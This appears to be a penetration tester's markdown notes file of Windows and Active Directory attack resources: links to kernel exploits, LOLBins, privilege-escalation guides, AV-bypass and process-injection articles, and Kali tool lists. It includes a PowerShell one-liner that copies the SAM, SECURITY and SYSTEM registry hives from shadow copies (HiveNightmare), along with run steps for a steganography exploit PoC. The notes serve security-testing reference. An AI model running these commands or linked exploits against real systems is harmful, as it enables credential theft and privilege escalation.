# Windows Commands:
1. https://ss64.com/nt/
2. https://ss64.com/ps/

# Windows Binaries 
https://learn.microsoft.com/en-us/sysinternals/downloads/

# Living Off the Land:
https://lolbas-project.github.io/

# Windows Exploits:
1. Windows Kernel Exploits — https://github.com/SecWiki/windows-kernel-exploits
2. LOLBins - https://lolbas-project.github.io/#
3. Windows Takeover completely from Linux — https://www.sprocketsecurity.com/blog/the-ultimate-tag-team-petitpotam-and-adcs-pwnage-from-linux
4. Windows Credentials — https://www.alteredsecurity.com/post/fantastic-windows-logon-types-and-where-to-find-credentials-in-them
5. Microsoft Won't Fix List — https://github.com/cfalta/MicrosoftWontFixList/blob/main/README.md
6. https://github.com/GossiTheDog/HiveNightmare
7. https://github.com/GossiTheDog/SystemNightmare
8. https://github.com/leechristensen/SpoolSample
9. https://github.com/topotam/PetitPotam
10. https://github.com/antonioCoco/RemotePotato0
11. https://github.com/S3cur3Th1sSh1t/SharpNamedPipePTH
12. https://github.com/cube0x0/CVE-2021-1675
13. maps Windows APIs to common techniques used by malware - https://malapi.io/

### HiveNightmare Powershell One Liner:
https://twitter.com/splinter_code/status/1420546784250769408
```
powershell -c "foreach ($i in 1..10){$p='\\.\HarddiskVolumeShadowCopy{0}\windows\system32\config\' -f $i; gi $($p+'SAM'),$($p+'SECURITY'),$($p+'SYSTEM') -ErrorAction SilentlyContinue | % {cp $_.FullName $($_.BaseName+$i)}}"
```



### System Nightmare Incognito 
Install Packages if Needed.
```
python3 -m pip install --upgrade pip
python3 -m pip install --upgrade Pillow
or
python -m pip install --upgrade pip
python -m pip install --upgrade Pillow
Install Bitstring
python3 -m pip install --upgrade bitstring
```
Download: 
1. https://raw.githubusercontent.com/ciwen3/Public/master/python/steganography/Steganograpy-PoC.py
2. https://github.com/ciwen3/Public/raw/master/python/steganography/resources/rednightmare.PNG

In CMD run:
```
python ./Steganograpy-Poc.py ./rednightmare.PNG
```
Alternate:
download the exe (might get flagged as malicious)
https://github.com/ciwen3/Public/blob/master/python/steganography/Steganograpy-PoC.exe?raw=true

# Windows AD take over completely from Linux:
https://www.sprocketsecurity.com/blog/the-ultimate-tag-team-petitpotam-and-adcs-pwnage-from-linux

# Windows Login Credentials:
https://www.alteredsecurity.com/post/fantastic-windows-logon-types-and-where-to-find-credentials-in-them

# Checklist:
https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation

# Windows Privilege Escalation:
https://www.fuzzysecurity.com/tutorials/16.html

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md

https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/

https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html


# Find Windows 10 Product Key on a New Computer:
```
wmic path SoftwareLicensingService get OA3xOriginalProductKey
```

# Windows Resources in Kali:
```
/usr/share/windows-resources$ ls

binaries  
hyperion  
mimikatz  
ncat      
nishang  
ollydbg  
powersploit  
sbd          
sqldict  
tftpd32
wce
```
## Reporting
* [Sysreptor](https://github.com/Syslifters/sysreptor)
* [Sysreptor-gpt fork](https://github.com/xko2x/sysreptor-gpt/)
* [pwndoc](https://github.com/pwndoc/pwndoc) 
* [pwndoc-ng](https://github.com/pwndoc-ng/pwndoc-ng)
* [writehat](https://github.com/blacklanternsecurity/writehat)
* [Ghostwriter](https://github.com/GhostManager/Ghostwriter)
* [MKdocs = more like a notes than report](https://squidfunk.github.io/mkdocs-material/getting-started/)

## cheatsheets

* [Interactive cheat sheet, containing a curated list of offensive security tools and their respective commands, to be used against Windows/AD environments](https://wadcoms.github.io/)
* [GTFOBins](https://gtfobins.github.io/)
* [wtfbins](https://wtfbins.wtf/)
* [LOLBAS](https://lolbas-project.github.io/)
* [Living Off Trusted Sites (LOTS) Project](https://lots-project.com/)
* [loldrivers](https://www.loldrivers.io/)
* [Malicious Windows API](https://malapi.io/)
* [MacOS lolbins](https://www.loobins.io/)
* [API docs based on Process Hacker](https://ntdoc.m417z.com/)
* [pentest checklist](https://github.com/deletehead/the_hax)
* [pentesting web checklist](https://pentestbook.six2dez.com/others/web-checklist)
* [masscan_cheatsheet](https://cheatsheet.haax.fr/network/port-scanning/masscan_cheatsheet/)
* [offsec gist notes 1](https://gist.github.com/boh/658f32c444d4c87a195bc0677491c855)
* [AttackerKB CLI interact](https://github.com/horshark/akb-explorer)
* [FILESEC.IO](https://filesec.io/)
* [UNPROTECT PROJECT](https://search.unprotect.it/)
* [HUNTING PROCESS INJECTION BY WINDOWSAPI CALLS (2019-11)](https://malwareanalysis.co/wp-content/uploads/2019/11/Hunting-Process-Injection-by-Windows-API-Calls.pdf)
* [Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques](https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process)
* [Code & Process Injection,Red Teaming Experiments](https://ired.team/offensive-security/code-injection-process-injection)
* [Windows Process Injection: Command Line and Environment Variables](https://modexp.wordpress.com/2020/07/31/wpi-cmdline-envar/)
* [Windows Process Injection](https://github.com/odzhan/injection)
* [A Museum of API Obfuscation on Win32](https://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/a_museum_of_api_obfuscation_on_win32.pdf)
* [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)
* [How to Bypass Anti-Virus to Run Mimikatz,2017](https://www.blackhillsinfosec.com/bypass-anti-virus-run-mimikatz/)




## collections & howto's
* [Pentest-Tools-Collection](https://github.com/LuemmelSec/Pentest-Tools-Collection)
* [Collection of Anti-Malware Analysis Tricks.(2016-10)](https://forum.tuts4you.com/topic/38931-collection-of-anti-malware-analysis-tricks/)
* [Evasion techniques,checkpoint,2020](https://evasions.checkpoint.com/)
* [The Art Of Malware - Bringing the dead back to life,0x00sec,2020](https://0x00sec.org/t/the-art-of-malware-bringing-the-dead-back-to-life/19599)
* [pentest-guide](https://github.com/Voorivex/pentest-guide)
* [Creds](https://github.com/S3cur3Th1sSh1t/Creds)
* [attacking AD](https://zer1t0.gitlab.io/posts/attacking_ad/)
* [attacking RBCD](https://www.alteredsecurity.com/post/resource-based-constrained-delegation-rbcd)
* [AD CS/PKI template exploit via PetitPotam and NTLMRelayx, from 0 to DomainAdmin in 4 steps](https://www.bussink.net/ad-cs-exploit-via-petitpotam-from-0-to-domain-domain/)
* [Active Directory Certificate Services (ADCS - PKI) domain admin vulnerability](https://isc.sans.edu/diary/27668)
* [From RPC to RCE - Workstation Takeover via RBCD and MS-RPChoose-Your-Own-Adventure](https://gist.github.com/gladiatx0r/1ffe59031d42c08603a3bde0ff678feb)
* [Intranet_Penetration_Tips](https://github.com/Ridter/Intranet_Penetration_Tips)
* [printspoofer-abusing-impersonate-privileges](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
* [Helpful operator notes and techniques in actionable form / mostly windows](https://obscuritylabs.github.io/operator-up/)
* [Pentest tips and tools](https://github.com/S3cur3Th1sSh1t/Pentest-Tools)

## Misc tools
* [Arsenal is just a quick inventory and launcher for hacking programs](https://github.com/Orange-Cyberdefense/arsenal)
* [Hacking SIEMs](https://github.com/ElevenPaths/siemframework)
* [client/server that aim to find reverse port open](https://github.com/Piosec/Golconda)
* [Privilege accounts search](https://github.com/cyberark/ACLight)
* [TIDoS-Framework automation from recon to exploitation](https://github.com/0xInfection/TIDoS-Framework)
* [Vision2 / Nmap's XML result parse and NVD's CPE correlation to search CVE.](https://github.com/CoolerVoid/Vision2)
* [create reverse shells online](https://www.revshells.com/)
* [bypass network protections while downloading a file](https://github.com/blackhillsinfosec/skyhook)
* [Network infrastructure hacking scripts](https://github.com/c4s73r/Above)
* [SCCM hacking](https://github.com/garrettfoster13/sccmhunter)

## Recon
* [GoRecon - parse Nessus, Burp, gitleaks etc](https://github.com/mr-pmillz/gorecon)

### AD tools & techniques
* [A collection of tools that integrate to BloodHound](https://github.com/zeronetworks/BloodHound-Tools)
* [Offline ingestor for Bloodhound - ADExplorer](https://github.com/c3c/ADExplorerSnapshot.py)
* [dirkjan zerologon vuln](https://twitter.com/_dirkjan/status/1306280553281449985)
* [zerologon-attacking-defending](https://blog.zsec.uk/zerologon-attacking-defending/)
* [an-introduction-to-manual-active-directory-querying-with-dsquery-and-ldapsearch](https://posts.specterops.io/an-introduction-to-manual-active-directory-querying-with-dsquery-and-ldapsearch-84943c13d7eb)
* [active-directory-python-edition](https://hideandsec.sh/books/cheatsheets-82c/page/active-directory-python-edition)
* [active-directory security mindmap checklist](https://hideandsec.sh/books/cheatsheets-82c/page/active-directory)

### network tools & guides
* [RustScan](https://github.com/RustScan/RustScan)
* [tcpdump101 made easy](https://tcpdump101.com/#)
* WIFI [eaphammer](https://buaq.net/go-57.html)
* WIFI [workshops-advanced-wireless-attacks/](https://solstice.sh/workshops-advanced-wireless-attacks/)

### on-site
* [802.1x bypass](https://github.com/Orange-Cyberdefense/fenrir-ocd)

### osint
* [osint automation](https://github.com/blacklanternsecurity/bbot)
